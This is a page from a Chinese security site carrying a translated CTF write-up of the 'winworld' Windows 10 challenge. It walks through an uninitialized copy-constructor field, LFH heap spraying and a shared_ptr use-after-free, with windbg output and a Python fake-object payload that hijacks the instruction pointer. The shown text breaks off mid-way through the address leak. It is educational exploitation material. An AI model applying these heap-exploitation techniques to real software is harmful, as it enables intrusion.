<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】在Windows10中利用一个误用的C++共享指针 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Windows10,C++,指针"/>
    
        <meta name="description" content="在本文中，我描述了我的“winworld”挑战的一个详细的解决方案，这个挑战来自Insomni’hack CTF Teaser 2017。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】在Windows10中利用一个误用的C++共享指针</h2>
                <div class="article-msg">
                    <span class="time">2017-02-09 13:55:38</span>
                    
                                        <span class="read">阅读：10891次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3468"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3468" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/"
                             target="_blank">来源： blog.scrt.ch</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2775084127" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2775084127" style="color:#848e99;">myswsun</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="white-space: normal;text-align: center"><img src="http://p4.qhimg.com/t01f1099f325290eef0.png" title="t01d116ceb5acf17c6a.png" alt="http://p6.qhimg.com/t01d116ceb5acf17c6a.png"/></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"></span></strong></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900; color: rgb(0, 112, 192); text-indent: 2em;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2775084127" target="_blank" style="text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900; color: rgb(0, 112, 192); text-indent: 2em;">myswsun</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900; color: rgb(0, 112, 192); text-indent: 2em;">预估稿费：200RMB</span><br/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></p><p style="white-space: normal; text-indent: 2em;"><br/></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x00&nbsp;前言</span></strong></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">在本文中，我描述了我的“winworld”挑战的一个详细的解决方案，这个挑战来自Insomni’hack CTF Teaser 2017。Winworld是一个使用C++11编写的x64的Windows二进制文件，并且包含了大部分Windows 10内置的保护措施，特别是AppContainer(</span><a href="https://github.com/trailofbits/AppJailLauncher" style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9); text-decoration: none;"><strong><span style="font-family: 微软雅黑, sans-serif; color: rgb(227, 108, 9);">AppJailLauncher</span></strong></a><span style="font-family: 微软雅黑, sans-serif">)、执行流保护和最新的缓解策略。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">这些能使用Process Hacker快速的验证（也要注意保留的2TB的CFGBitmap）：</span></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p8.qhimg.com/t0170b2ce995e503289.png" title="t019e73e55e5ebd41cc.png" alt="http://p1.qhimg.com/t019e73e55e5ebd41cc.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">这个任务运行在Windows Server 2016上面，挑战的行为与Windows 10一致，甚至使用了相同的库。这个挑战和描述能在</span><a href="https://github.com/Insomnihack/Teaser-2017/tree/master/winworld"><span style="font-family: 微软雅黑, sans-serif">这里</span></a><span style="font-family: 微软雅黑, sans-serif">找到。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x01&nbsp;二进制的逻辑</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">我们的今年的主题是“机器的风险”；winworld是最新的Westworls TV秀，并实现了一个“narrator”接口，你能够创建机器人和人类，配置他们的行为，并且在地图上面移动他们。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">这个narrator操作Person对象，这个对象是“hosts”（robots）和“guests”（humans）的共享类。每个类型存储在独立的列表中。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">每个Person对象有下面的属性：</span></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p2.qhimg.com/t01c429129db0e0ea08.png" title="t01e2011c0a7c3f670e.png" alt="http://p9.qhimg.com/t01e2011c0a7c3f670e.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">这个narrator暴露了下面的命令：</span></p><pre class="brush:bash;toolbar:false">--[&nbsp;Welcome&nbsp;to&nbsp;Winworld,&nbsp;park&nbsp;no&nbsp;1209&nbsp;]--
narrator&nbsp;[day&nbsp;1]$&nbsp;help
Available&nbsp;commands:
&nbsp;-&nbsp;new&nbsp;&lt;type&gt;&nbsp;&lt;sex&gt;&nbsp;&lt;name&gt;
&nbsp;-&nbsp;clone&nbsp;&lt;id&gt;&nbsp;&lt;new_name&gt;
&nbsp;-&nbsp;list&nbsp;&lt;hosts|guests&gt;
&nbsp;-&nbsp;info&nbsp;&lt;id&gt;
&nbsp;-&nbsp;update&nbsp;&lt;id&gt;&nbsp;&lt;attribute&gt;&nbsp;&lt;value&gt;
&nbsp;-&nbsp;friend&nbsp;&lt;add|remove&gt;&nbsp;&lt;id&nbsp;1&gt;&nbsp;&lt;id&nbsp;2&gt;
&nbsp;-&nbsp;sentence&nbsp;&lt;add|remove&gt;&nbsp;&lt;id&gt;&nbsp;&lt;sentence&gt;
&nbsp;-&nbsp;map
&nbsp;-&nbsp;move&nbsp;&lt;id&gt;&nbsp;{&lt;l|r|u|d&gt;+}
&nbsp;-&nbsp;random_move
&nbsp;-&nbsp;next_day
&nbsp;-&nbsp;help
&nbsp;-&nbsp;prompt&nbsp;&lt;show|hide&gt;
&nbsp;-&nbsp;quit
narrator&nbsp;[day&nbsp;1]$</pre><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">在调用move或者random_move时行为发生，2个人相遇了。这个onEncounter方法指针被调用，他们能交互。只有攻击实际对其他Person对象有影响：如果攻击成功了，其他对象可能损坏或者死亡。Robots会永久死亡但是不能杀死humans。Humans只能活一次并且能杀死其他humans。next_day功能能复活robots的生命和恢复每个人的健康，但是如果对象是一个死人，将会被移除出列表。</span></p><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif"></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">People使用马尔可夫链的自动的方式交流，这种方式使用Westworld脚本初始化和添加句子，这个可能会发生有趣的对话。许多句子不能一直有效，因为有漏洞存在，我在描述中指定了它，以节省一些逆向的时间（已经有大量的C ++逆向了）。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x02&nbsp;弱点1：在Person中复制构造函数未初始化属性</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">在narrator初始化期间，map随机生成并且一个特定的点被选作“maze center”，当某些特定条件达到时，机器人将转变为人类。这个条件是当前移动的Person必须是HOST，设置了is_conscious，并且必须有一个人类（GUEST）在maze center。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">第一件事是找到这个点。所有的随机数据能使用rand()获得，并且这个种子使用经典的srand(time(NULL))来初始化。因此这个种子能通过几次尝试来确定。一旦同步了服务器的时钟，在利用中简单的重放初始化算法能允许找到用来生成maze center的rand()的值。编写一个简单的路径查找算法来使每个人都到这个位置。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">机器人通过Person::Person构造函数中的is_conscious=false来初始化。然而这个Person::Person的拷贝构造函数被narrator的clone函数使用了，但是忘记了初始化。这个值将是未初始化的，并可以使用堆上面已有的内容。结果是克隆一个机器人足以使的is_conscious!=0，但是我们需要确保它是。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">有时新克隆的机器人将在LFH中，有时不是。最好是通过克隆0x10减去当前的Person对象数（6）来确保总是在LFH中。让我们克隆6+1次并在windbg中检验：</span></p><pre class="brush:bash;toolbar:false">0:004&gt;&nbsp;?&nbsp;winworld!Person::Person
Matched:&nbsp;00007ff7`9b9ee700&nbsp;winworld!Person::Person&nbsp;(&lt;no&nbsp;parameter&nbsp;info&gt;)
Matched:&nbsp;00007ff7`9b9ee880&nbsp;winworld!Person::Person&nbsp;(&lt;no&nbsp;parameter&nbsp;info&gt;)
Ambiguous&nbsp;symbol&nbsp;error&nbsp;at&nbsp;&#39;winworld!Person::Person&#39;
0:004&gt;&nbsp;bp&nbsp;00007ff7`9b9ee880&nbsp;&quot;r&nbsp;rcx&nbsp;;&nbsp;g&quot;&nbsp;;&nbsp;bp&nbsp;winworld!Person::printInfos&nbsp;;&nbsp;g
rcx=0000024a826a3850
rcx=0000024a826800c0rcx=0000024a82674130
rcx=0000024a82674310
rcx=0000024a82673a50
rcx=0000024a82673910
rcx=0000024a82673d70Breakpoint&nbsp;1&nbsp;hit
winworld!Person::printInfos:
00007ff7`9b9f0890&nbsp;4c8bdc&nbsp;mov&nbsp;r11,rsp
0:000&gt;&nbsp;r&nbsp;rcx
rcx=0000024a82673d700:000&gt;&nbsp;!heap&nbsp;-x&nbsp;0000024a826800c0Entry&nbsp;User&nbsp;Heap&nbsp;Segment&nbsp;Size&nbsp;PrevSize&nbsp;Unused&nbsp;Flags
-------------------------------------------------------------------------------------------------------------
0000024a826800b0&nbsp;0000024a826800c0&nbsp;0000024a82610000&nbsp;0000024a82610000&nbsp;a0&nbsp;120&nbsp;10&nbsp;busy&nbsp;
0:000&gt;&nbsp;!heap&nbsp;-x&nbsp;0000024a82673d70Entry&nbsp;User&nbsp;Heap&nbsp;Segment&nbsp;Size&nbsp;PrevSize&nbsp;Unused&nbsp;Flags
-------------------------------------------------------------------------------------------------------------
0000024a82673d60&nbsp;0000024a82673d70&nbsp;0000024a82610000&nbsp;0000024a828dec10&nbsp;a0&nbsp;-&nbsp;10&nbsp;LFH;busy</pre><p style="white-space: normal; text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, sans-serif; text-indent: 28px;">在这里我们能看到头2个不在LFH中，其他的都在。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">LFH分配是随机的，增加了一些挑战。然而这些分配使用大小为0x100的数组随机化，其位置以模数0x100递增，这意味着如果我们喷射正确大小的0x100个元素，我们将回到相同的位置，从而获得确定性行为。我们甚至不需要保证内存块，因此我们能简单的使用0x90大小（和Person一样）的命令字符串来喷射，它总是为clone操作初始化is_conscious属性。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">现在我们的机器人变成了人类，并且麻烦再次开始！</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">注意：似乎Visual Studio 2015默认开启了/sdl编译标记，这将添加memset函数来将分配的Person对象填充为0，因此变得不可利用。我禁用了它，但为了公平起见，我开启了不是默认的CFG！</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x03&nbsp;弱点2：误用了std::shared_ptr</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">共享指针是一个对象指针的简单封装。它特别添加了引用计数，在shared_ptr关联了新的变量时会增加计数，当释放了变量会减少计数。当引用计数变为0时，引用对象将不会存在，因此它自动释放它。针对UAF漏洞这个特别有效。</span><br/></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p6.qhimg.com/t0113319a69abadde0e.png" title="t0125b3364e5cb12851.png" alt="http://p0.qhimg.com/t0125b3364e5cb12851.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">在这个挑战中，当机器人变成人类，它还保留在robtots列表中（但是它的is_enable字段变为false，因此不能再作为机器人了），并且被插入到humans列表中：</span></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p0.qhimg.com/t016446ad6447149f53.png" title="t013f14e148da83baa1.png" alt="http://p0.qhimg.com/t013f14e148da83baa1.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">这是非常错误的，因为不是增加对象的shared_str的引用计数，我们创建了一个新的shared_str只想一个相同的对象：</span></p><p style="white-space: normal;text-align: center"><img src="http://p0.qhimg.com/t017c675c52ccce1c3f.png" title="t0107d9917696ce93fe.png" alt="http://p1.qhimg.com/t0107d9917696ce93fe.png"/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">当任意两个shared_ptr的引用计数降为0，这个对象被释放，并且因为其他shared_ptr还存活着，我们还是可以利用UAF漏洞！为了做到这个，我们能杀掉human-robot来使用另一个人类。我们也不得不移除他所有的朋友，否则引用计数不会为0。然后当它从guests向量中移除了指针时，使用next_day方法释放它：</span></p><p style="white-space: normal;text-align: center"><span style="font-family: 微软雅黑, sans-serif"><img src="http://p7.qhimg.com/t019b0d0e349991895f.png" title="t01624debeea32f0f68.png" alt="http://p1.qhimg.com/t01624debeea32f0f68.png"/></span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">现在得到RIP是简单的，因为对象拥有一个方法指针：使用一个假对象来喷射长度0x90的0x100个字符串，这个对象是std::string能包含空字节，然后将死掉的human-robot右移，他将再次遇到他的杀手，并触发覆盖onEncounter的方法指针：</span></p><pre class="brush:python;toolbar:false">def&nbsp;craft_person(func_ptr,&nbsp;leak_addr,&nbsp;size):
&nbsp;payload&nbsp;=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;func_ptr)&nbsp;#&nbsp;func&nbsp;pointer
&nbsp;payload&nbsp;+=&nbsp;&quot;\x00&quot;&nbsp;*&nbsp;24&nbsp;#&nbsp;friends&nbsp;std::vector
&nbsp;payload&nbsp;+=&nbsp;&quot;\x00&quot;&nbsp;*&nbsp;24&nbsp;#&nbsp;sentences&nbsp;std::vector

&nbsp;#&nbsp;std::string&nbsp;name
&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;leak_addr)
&nbsp;payload&nbsp;+=&nbsp;&quot;JUNKJUNK&quot;
&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;size)&nbsp;#&nbsp;size
&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;size)&nbsp;#&nbsp;max_size

&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;1)&nbsp;#&nbsp;type&nbsp;=&nbsp;GUEST
&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;1)&nbsp;#&nbsp;sex
&nbsp;payload&nbsp;+=&nbsp;&quot;\x01&quot;&nbsp;#&nbsp;is_alive
&nbsp;payload&nbsp;+=&nbsp;&quot;\x01&quot;&nbsp;#&nbsp;is_conscious
&nbsp;payload&nbsp;+=&nbsp;&quot;\x01&quot;&nbsp;#&nbsp;is_enabled
&nbsp;[...]

payload&nbsp;=&nbsp;craft_person(func_ptr=0x4242424242424242,&nbsp;leak_addr=0,&nbsp;size=0)for&nbsp;i&nbsp;in&nbsp;range(0x100):
&nbsp;&nbsp;&nbsp;&nbsp;sendline(s,&nbsp;payload)
sendline(s,&nbsp;&quot;move&nbsp;h7&nbsp;lr&quot;)</pre><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">结果：</span><br/></p><pre class="brush:bash;toolbar:false">0:004&gt;&nbsp;g
(1a00.c68):&nbsp;Access&nbsp;violation&nbsp;-&nbsp;code&nbsp;c0000005&nbsp;(first&nbsp;chance)
First&nbsp;chance&nbsp;exceptions&nbsp;are&nbsp;reported&nbsp;before&nbsp;any&nbsp;exception&nbsp;handling.
This&nbsp;exception&nbsp;may&nbsp;be&nbsp;expected&nbsp;and&nbsp;handled.
ntdll!LdrpValidateUserCallTarget+0xe:
00007ffa`89b164ae&nbsp;488b14c2&nbsp;mov&nbsp;rdx,qword&nbsp;ptr&nbsp;[rdx+rax*8]&nbsp;ds:010986ff`08d30908=????????????????
0:000&gt;&nbsp;?&nbsp;rax&nbsp;&lt;&lt;&nbsp;9
Evaluate&nbsp;expression:&nbsp;4774451407313060352&nbsp;=&nbsp;42424242`42424200</pre><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif;">CFG将使问题变得复杂一点，但是在那之前我们需要来泄漏地址对抗ASLR。</span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif"><br/></span></strong></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-size: 18px;line-height: 31.14px;font-family: 微软雅黑, sans-serif">0x04&nbsp;泄漏二进制基地址</span></strong></p><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif"></span></p><hr/><p style="white-space: normal; text-indent: 28px;"><span style="font-family: 微软雅黑, sans-serif">在前一个代码样本中我们制作了一个大小为0的std:string来阻止打印名字时崩溃。用有效值来替换指针和大小将在该地址打印大小字节，因此我们使用任意原始读写。现在我们打印了什么?除了_KUSER_SHARED_DATA的地址0x7ffe0000，其他都有ASLR，但是在Windows 10中它不能容纳任何指针。</span><br/></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">代替使用字符串来利用UAF，我们必须使用相同LFH大小（0xa0）的另一个对象来替换Person对象。我们没有其他的，但是我们能增加vector的大小来代替。</span></p><p style="white-space: normal;text-indent: 28px"><span style="font-family: 微软雅黑, sans-serif">使用std::vector&lt;std::shared_ptr&lt;Person&gt;&gt; friends来循环测试，我们使用7-9 friends能得到一些东西：</span></p><pre class="brush:bash;toolbar:false">0:004&gt;&nbsp;g
Breakpoint&nbsp;0&nbsp;hit
winworld!Person::printInfos:
00007ff7`9b9f0890&nbsp;4c8bdc&nbsp;mov&nbsp;r11,rsp
0:000&gt;&nbsp;dq&nbsp;rcx
000001cf`94daea60&nbsp;00007ff7`9b9ef700&nbsp;000001cf`94d949b0000001cf`94daea70&nbsp;000001cf`94d94a20&nbsp;000001cf`94d94a40
000001cf`94daea80&nbsp;000001cf`94dac6c0&nbsp;000001cf`94dac760
000001cf`94daea90&nbsp;000001cf`94dac780&nbsp;00736572`6f6c6f44
000001cf`94daeaa0&nbsp;61742074`73657567&nbsp;00000000`00000007
000001cf`94daeab0&nbsp;00000000`0000000f&nbsp;00000002`00000000
